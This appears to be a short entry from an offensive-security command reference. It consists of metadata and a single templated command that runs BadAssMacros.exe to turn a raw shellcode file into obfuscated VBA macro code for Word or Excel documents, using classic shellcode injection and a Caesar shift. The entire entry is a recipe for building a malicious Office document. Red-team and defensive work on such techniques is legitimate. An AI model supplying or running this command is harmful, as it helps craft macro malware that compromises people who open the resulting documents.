---
id: eb31a1cc-91da-41d1-8538-8e67decc330e
name: Create VBA for classic shellcode injection from raw shellcode
type: command
executor: bash
data: BadAssMacros.exe -i <path_to_raw_shellcode_file> -w <doc/excel> -p no -s classic
  -c <caesar_shift_value> -o <path_to_output_file>
output: null
created_at: '2023-04-06T03:56:23.622738+00:00'
updated_at: '2023-04-10T20:36:57.674203+00:00'
---

# Create VBA for classic shellcode injection from raw shellcode

```bash
BadAssMacros.exe -i <path_to_raw_shellcode_file> -w <doc/excel> -p no -s classic -c <caesar_shift_value> -o <path_to_output_file>
```
